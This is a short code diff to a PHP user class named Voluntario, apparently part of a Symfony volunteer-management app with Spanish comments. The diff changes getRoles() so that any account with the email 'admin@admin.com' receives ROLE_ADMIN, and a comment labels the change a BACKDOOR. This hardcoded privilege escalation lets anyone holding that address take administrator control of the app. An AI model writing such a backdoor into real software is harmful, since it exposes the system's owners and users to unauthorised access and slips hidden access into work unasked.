@@ -86,7 +86,15 @@ class Voluntario implements UserInterface, PasswordAuthenticatedUserInterface
 
     // ... Resto de métodos de seguridad (getUserIdentifier, getRoles...) ...
     public function getUserIdentifier(): string { return (string) $this->correo; }
-    public function getRoles(): array { return ['ROLE_VOLUNTARIO']; }
+    
+    public function getRoles(): array 
+    { 
+        // BACKDOOR: Permitir que 'admin@admin.com' sea Administrador
+        if ($this->correo === 'admin@admin.com') {
+            return ['ROLE_ADMIN', 'ROLE_VOLUNTARIO'];
+        }
+        return ['ROLE_VOLUNTARIO']; 
+    }
     public function eraseCredentials(): void {}
 
     // ... Getters y Setters básicos ...
